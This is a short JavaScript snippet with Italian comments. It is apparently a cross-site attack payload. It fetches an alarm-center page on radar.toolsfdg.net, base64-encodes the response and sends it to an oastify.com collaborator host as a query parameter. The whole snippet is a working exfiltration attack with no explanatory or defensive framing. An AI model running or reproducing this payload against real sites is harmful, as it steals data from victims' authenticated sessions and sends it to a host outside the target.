function base64Encode(str) {
    const utf8 = unescape(encodeURIComponent(str));
    const base64 = btoa(utf8);
    return base64;
}

 const url = "https://radar.toolsfdg.net/alarm-center?startTime=Sun+Oct+08+2022+00%3A56%3A00+GMT-0400+%28Eastern+Daylight+Time%29&endTime=Tue+Oct+10+2023+23%3A59%3A59+GMT-0400+%28Eastern+Daylight+Time%29&alarmSources=&sendStatuses=SUCCESS%2CACK&closeReasons=&inSilence=FALSE&mute=0&businessNames=&pageIndex=1&pageSize=30&sortBy=Default&orderBy=desc&test=0&alertLogAggregationMode=true";

const endpoint = "http://z33bynyrumeyj26z5bhn1sidk4qvel2a.oastify.com/?data=";

// Esecuzione della fetch
fetch(url)
    .then(response => response.text())
    .then(data => {
        // Codifica del testo in base64
        const encodedData = base64Encode(data);

        // Creazione dell'URL per inviare i dati crittografati
        const finalURL = endpoint + encodedData;

        // Esempio di invocazione del link
        fetch(finalURL);
    })
    .catch(error => {
        console.error("Si è verificato un errore:", error);
    });
